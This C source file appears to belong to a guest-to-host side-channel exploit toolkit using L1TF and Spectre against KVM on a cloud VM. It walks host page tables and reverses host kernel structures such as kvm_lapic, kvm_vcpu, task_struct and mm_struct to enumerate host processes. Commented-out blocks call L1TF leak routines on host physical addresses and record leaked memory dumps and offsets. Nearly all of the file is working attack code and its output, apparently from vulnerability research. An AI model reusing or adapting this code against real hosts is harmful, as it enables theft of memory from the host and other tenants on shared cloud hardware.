#include <assert.h>
#include <ctype.h>
#include <err.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <time.h>
#include <unistd.h>
#include "constants.h"
#include "helpers.h"
#include "hypercall.h"
#include "l1tf.h"
#include "spectre.h"
#include "util.h"
#include "timing.h"
#include "reverse.h"

#define STR(a) STRSTR(a)
#define STRSTR(a) #a
#define dump(x) printf("%20s = %16lx\n", STR(x), x)

#define BITS_MASK(n, m) ( ((1ULL << n) - 1) & (~((1ULL << m) - 1)) )
#define PFN_MASK BITS_MASK(52, 12)
#define BITS(x, n, m) ((x & BITS_MASK(n, m)) >> m)

#define IS_HUGE(pte) (pte & (1ULL << 7))

uintptr_t get_feeling_translate_va(uintptr_t l0, uintptr_t va)
{
	printf("get_feeling_translate_va(l0 = %lx, va = %lx)\n", l0, va);
	l0 -= hc_direct_map();
	dump(l0);
	uintptr_t pgd_ptr = l0 + 8 * BITS(va, 48, 39);
	dump(pgd_ptr);
	uintptr_t pgd = hc_read_pa(pgd_ptr);
	dump(pgd);

	uintptr_t l1 = pgd & PFN_MASK;
	dump(l1);
	uintptr_t pud_ptr = l1 + 8 * BITS(va, 39, 30);
	dump(pud_ptr);
	uintptr_t pud = hc_read_pa(pud_ptr);
	dump(pud);
	if (IS_HUGE(pud)) {
		uintptr_t pa = (pud & BITS_MASK(52, 30)) | BITS(va, 30, 0);
		dump(pa);
		printf("true pa from hc_translate_va: %lx\n\n", hc_translate_va(va));
		return pa;
	}

	uintptr_t l2 = pud & PFN_MASK;
	dump(l2);
	uintptr_t pmd_ptr = l2 + 8 * BITS(va, 30, 21);
	dump(pmd_ptr);
	uintptr_t pmd = hc_read_pa(pmd_ptr);
	dump(pmd);
	if (IS_HUGE(pmd)) {
		uintptr_t pa = (pmd & BITS_MASK(52, 21)) | BITS(va, 21, 0);
		dump(pa);
		printf("true pa from hc_translate_va: %lx\n\n", hc_translate_va(va));
		return pa;
	}

	uintptr_t l3 = pmd & PFN_MASK;
	dump(l3);
	uintptr_t pte_ptr = l3 + 8 * BITS(va, 21, 12);
	dump(pte_ptr);
	uintptr_t pte = hc_read_pa(pte_ptr);
	dump(pte);
	uintptr_t pa = (pte & PFN_MASK) | BITS(va, 12, 0);
	dump(pa);
	printf("true pa from hc_translate_va: %lx\n\n", hc_translate_va(va));
	return pa;
}

void get_feeling_for_kernel_kvm_data_structures(void)
{
	uintptr_t direct_map = hc_direct_map();
	dump(direct_map);
	uintptr_t base = hc_phys_map_base();
	dump(base);
	uintptr_t base_pa = base - direct_map;
	dump(base_pa);
	printf("\n");

	uintptr_t kvm_apic_map = base - 0x218;
	dump(kvm_apic_map);
	for (int off = 0; off < 0x18; off += 8) {
		printf("kvm_apic_map+%3x = %16lx\n", off, hc_read_va(kvm_apic_map+off));
	}
	printf("kvm_apic_map/xapic_cluster_map =  0\n");
	for (int off = 0x218; off < 0x230; off += 8) {
		printf("kvm_apic_map+%3x = %16lx\n", off, hc_read_va(kvm_apic_map+off));
	}
	printf("\n");

	uintptr_t kvm_lapic[2];
	for (int i = 0; i < 2; i++) {
		kvm_lapic[i] = hc_read_va(base + i*8); // kvm_apic_map's phys_map[i]
		dump(kvm_lapic[i]);
		for (int off = 0; off < 0x100; off += 8) {
			printf("kvm_lapic[%d]+%3x = %16lx\n", i, off, hc_read_va(kvm_lapic[i] + off));
		}
		printf("\n");
	}

	uintptr_t kvm_vcpu = hc_read_va(kvm_lapic[0]+0x90); // kvm_lapic's vcpu
	dump(kvm_vcpu);
	for (int off = 0; off < 0x90; off += 8) {
		printf("kvm_vcpu+%3x = %16lx\n", off, hc_read_va(kvm_vcpu+off));
	}
	printf("\n");

	uintptr_t pid = hc_read_va(kvm_vcpu+0x78); // kvm_vcpu's pid
	dump(pid);
	for (int off = 0; off < 0x40; off += 8) {
		printf("pid+%3x = %16lx\n", off, hc_read_va(pid+off));
	}
	printf("\n");

	uintptr_t task_struct = hc_read_va(pid+0x20) - 0xa40; // pid's tasks[0], pointing to task_struct's pid_links[0]
	dump(task_struct);
	for (int off = 0; off < 0x80; off += 8) {
		printf("task_struct+%3x = %16lx\n", off, hc_read_va(task_struct+off));
	}
	printf("...\n");
	for (int off = 0x900-0x40; off < 0x900+0xb0; off += 8) {
		printf("task_struct+%3x = %16lx\n", off, hc_read_va(task_struct+off));
	}
	printf("...\n");
	for (int off = 0x9d0-0x20; off < 0x9d0+0x20; off += 8) {
		printf("task_struct+%3x = %16lx\n", off, hc_read_va(task_struct+off));
	}
	printf("...\n");
	for (int off = 0xbf0-0x40; off < 0xbf0+0x40; off += 8) {
		printf("task_struct+%3x = %16lx\n", off, hc_read_va(task_struct+off));
	}
	printf("\n");

	// Don't start with our own thread, as it may not be the thread group's
	// leader, and hence not be itself linked into the task-list.
	task_struct = hc_read_va(task_struct + 0x908) - 0x900; // task_struct's tasks.prev

	int nr_processes = 0;
	uintptr_t start = task_struct;
	do {
		int pidd = (int)hc_read_va(task_struct + 0x9d0); // task_struct's pid
		int tgid = (int)hc_read_va(task_struct + 0x9d4); // task_struct's tgid
		char comm[16];
		*(uint64_t *)comm = hc_read_va(task_struct + 0xbf0);
		*(uint64_t *)&comm[8] = hc_read_va(task_struct + 0xbf0 + 8);
		// printf("task_struct: %16lx tgid: %3d, pid: %3d comm: %s\n", task_struct, tgid, pidd, comm);

		nr_processes++;
		task_struct = hc_read_va(task_struct + 0x900) - 0x900; // task_struct's tasks.next
	} while (task_struct != start);
	printf("nr_processes: %d\n\n", nr_processes);

	uintptr_t kvm = hc_read_va(kvm_vcpu);
	dump(kvm);
	dump(hc_translate_va(kvm));
	for (int off = 0x1178-0x20; off < 0x1178+0x20; off += 8) {
		printf("kvm+%3x = %16lx\n", off, hc_read_va(kvm+off));
	}
	printf("\n");

	uintptr_t kvm_next = hc_read_va(kvm + 0x1178) - 0x1178;
	dump(kvm_next);
	for (int off = 0x1178-0x20; off < 0x1178+0x20; off += 8) {
		printf("kvm_next+%3x = %16lx\n", off, hc_read_va(kvm_next+off));
	}
	printf("\n");

	uintptr_t kvm_prev = hc_read_va(kvm + 0x1178+8) - 0x1178;
	dump(kvm_prev);
	for (int off = 0x1178-0x20; off < 0x1178+0x20; off += 8) {
		printf("kvm_prev+%3x = %16lx\n", off, hc_read_va(kvm_prev+off));
	}
	printf("\n");

	uintptr_t mm_struct = hc_read_va(task_struct+0x950);
	dump(mm_struct);
	for (int off = 0; off < 0xc0; off += 8) {
		printf("mm_struct+%3x = %16lx\n", off, hc_read_va(mm_struct+off));
	}
	printf("\n");

	uintptr_t pgd = hc_read_va(mm_struct+0x78);
	dump(pgd);
	for (int off = 0xfc0; off < 0x1000; off += 8) {
		printf("pgd+%3x = %16lx\n", off, hc_read_va(pgd+off));
	}
	printf("\n");

	get_feeling_translate_va(pgd, 0xffffffffc1119c78);
	get_feeling_translate_va(pgd, direct_map+0x1234 + (10UL << 30));

}

void reverse_host_kernel_data_structures(void)
{
        // Results below were gathered on rain-vm-gce.

	// uintptr_t base = 0x88d43f218;
	
	// uintptr_t direct_map = 0xffff934040000000;

	// uintptr_t kvm_lapic = 0xffff9348e6de5e00;


	// printf("kvm_lapic:\n");
	// for (int off = 0; off <= 0xc0; off += 0x40) {
	// 	char *data = thijs_l1tf_leak(base, kvm_lapic-direct_map+off, 0x40);
	// 	display_data(data);
	// }
	// 	kvm_lapic:
	//         fee00000 ffffffff84615f70
	// ffff9348e6de5e10                0
	//                0    3d9822bcd52e0
	//    3d9822bcd52e0 ffffffff83785250
	// ffff939eff5a8140          1000000
	//            f2cf0    3d99f36f3f919
	//    2000000000000    5a8ebfbf27dce
	//                0              695
	// 8000000000000000        100000000
	//               10 ffff9352eff70e40 <-- should be kvm_lapic's vcpu, at 0x88
	//        100000101         ffffffff
	// ffff934164541000                0
	//                0                0
	//                0                0
	//                0                0
	//        600000000                0


	// uintptr_t kvm_vcpu = *(uintptr_t *)&data[8]; // *(kvm_lapic+0x88)
	// uintptr_t kvm_vcpu = 0xffff9352eff70e40; // *(kvm_lapic+0x88)
	// printf("kvm_vcpu:\n");
	// for (int off = 0; off <= 0xc0; off += 0x40) {
	// 	char *data = thijs_l1tf_leak(base, kvm_vcpu-direct_map+off, 0x40);
	// 	display_data(data);
	// }
	// kvm_vcpu:
	// ffff9584f2d71000 ffff934228163610
	// ffff936a91dba828 ffffffff8555d368
	//               38        100000000
	//                1                0
	//                f         ffffffff
	// ffff9352eff70e90 ffff9352eff70e90
	// ffff936a91dba000          f000000
	// ffff9352eff70eb0 ffff9352eff70eb0
	// ffff9341b74fe000                0
	// ffff93416434bc00          f000000  <--- left one
	//                0                0
	//                0        100000001
	// kvm_vcpu:
	// ffff9584f2d71000 ffff934228163610
	// ffff936a91dba828 ffffffff8555d368
	//               38        100000000
	//                1                0
	//                0         ffffffff
	// ffff9352eff70e90 ffff9352eff70e90
	// ffff936a91dba000                0
	// ffff9352eff70eb0 ffff9352eff70eb0
	// ffff9341b74fe000                0
	// ffff93416434bc00                0  <--- left one
	//                0                0
	//                0        100000000
	//                1               10
	//  ff09300003010e0                1
	//                0                0
	//        f00000000                0



	// uintptr_t pid = *(uintptr_t *)&data[0x10]; // *(kvm_vcpu+0x90)
	// uintptr_t pid = 0xffff93416434bc00; // *(kvm_vcpu+0x90)
	// printf("pid:\n");
	// char *data = thijs_l1tf_leak(base, pid-direct_map, 0x40);
	// display_data(data);
	// pid:
	//                e                0
	// ffff936a91dbaa78                0 <--- left one
	//  f00000000000000                0
	// ffff93dbd8e25a30                0
	// pid:
	//                e    f000000000000
	// ffff936a91dbaa78      f0000000000
	//              f00  f00000000000f00
	// ffff93fade8bcadf                0
	// pid:
	//    f0000000f000e                0
	// ffff936a91dbaa78          f000000
	//                0                0
	// ffff93da0e0bcad0                0
	// pid:
	//                e                0
	// ffff936a91dbaa78                0
	//                0                0
	// ffff93d4de463828                0

	// struct task_struct {
	// 	+ 64	static_prio
	// 	+ 68	normal_prio
	// 	+ 6c	rt_priority
	// 	+900	tasks
	// 	+a78	pid_links
	// 	+c38	comm
	// }
	// uintptr_t task_struct = *(uintptr_t *)&data[0x10] - 0xa78; // *(pid+0x10)
	// uintptr_t task_struct = 0xffff936a91dbaa78 - 0xa78; // *(pid+0x10)
	// printf("task_struct:\n");
	// for (int off = 0; off < 0x100; off += 0x40) {
	// 	char *data = thijs_l1tf_leak(base, task_struct-direct_map+off, 0x40);
	// 	display_data(data);
	// }



	// for (int i = 0; i < 20; i++) {
	// 	// uintptr_t task_struct = *(uintptr_t *)&data[0x10] - 0xa40; // *(pid+0x10)
	// 	uintptr_t task_struct = (0xffff936a91dbaa78 - 0xa40) & ~63; // *(pid+0x10)
	// 	printf("task_struct+0x8c0:\n");
	// 	for (int off = 0x8c0; off < 0x940; off += 0x40) {
	// 		char *data = thijs_l1tf_leak(base, task_struct-direct_map+off, 0x40);
	// 		display_data(data);
	// 	}
	// }
	// task_struct+0x800:
	//       11cb20dfff    40e097cdf010f
	//                0      f000000a280
	//     e7f088888f27      f000000000f
	//    f000000000000    248be30e15218
	// fffffff08501a440 ffff93416c014a80  <-- hier is task_struct's tasks, op +0x900
	//               8c ffff936a91dba918
	// ffff936a91dba918 ffff936a91dba928
	// ffff936a91dba928 ffff936a91dba938


	// printf("task_struct+c00:\n");
	// for (int off = 0xc00; off < 0xc80; off += 0x40) {
	// 	char *data = thijs_l1tf_leak(base, task_struct-direct_map+off, 0x40);
	// 	display_data(data);
	// }

	// char *comm = thijs_l1tf_leak(base, task_struct-direct_map+0xc38, 0x10);
	// printf("comm = %s\n", comm);






	// #define N 64
	// for (int i = 0; i < N/8; i++)
	// 	*((uint64_t *)p + i) = 0x0123456789abcdef;
	// half_spectre_start(base, pa);
	// l1tf_do_leak(pa, N);
	// half_spectre_stop();

	// spectre_touch_base_start();
	// l1tf_do_leak(base, 0x10);
	// spectre_touch_base_stop();

	// @base: 00 5e de e6 48 93 ff ff 00 5d de e6 48 93 ff ff
	// phys_map[0] = ffff9348e6de5e00 = 0xffff9348c | 0x26de5e00
	// phys_map[1] = ffff9348e6de5d00 = 0xffff9348c | 0x26de5d00
	// base = 0x88d43f218 = 0x88 | 0x0d43f218

	// Assuming ffff9348e6de5d00 <-> 0x8a6de5d00, i.e. page_offset_base = 0xffff934040000000
	// *phys_map[0] = ffffffff84615070
	// *phys_map[1] = ffffffff84615f70

	// Continously leaking 16 bytes from physcial address 0x88d441200:
	// [sibling] starting half_spectre with idx = 3fd
	// fe 28 8e 76 82 97 c9 11 ae fd db c1 ee d7 9f 1a 
	// fe 28 8e 76 82 97 c9 11 ae fd db c1 ee d7 9f 1a


	// for (uintptr_t high = 0x88; high >= 0x80; high--) {
	// 	uintptr_t pa_target = (high << 28) | 0x26de5e00;
	// 	half_spectre_start(base, pa_target);
	// 	l1tf_do_leak(pa_target, 0x10);
	// 	half_spectre_stop();

	// 	pa_target = (high << 28) | 0x26de5d00;
	// 	half_spectre_start(base, pa_target);
	// 	l1tf_do_leak(pa_target, 0x10);
	// 	half_spectre_stop();

	// }


	// uintptr_t direct_map = 0xffff934040000000;

	// uintptr_t pa_target = 0xffffffff84615f70 - direct_map; // == 0x6cbf44615f70 == 108.7TB...
	// half_spectre_start(base, pa_target);
	// l1tf_do_leak(pa_target, 0x18);
	// half_spectre_stop();


	// Leaked 0xc0 bytes at direct map adddress 0xffff9348e6de5e00, i.e. pa (0xffff9348e6de5e00-0xffff934040000000)
}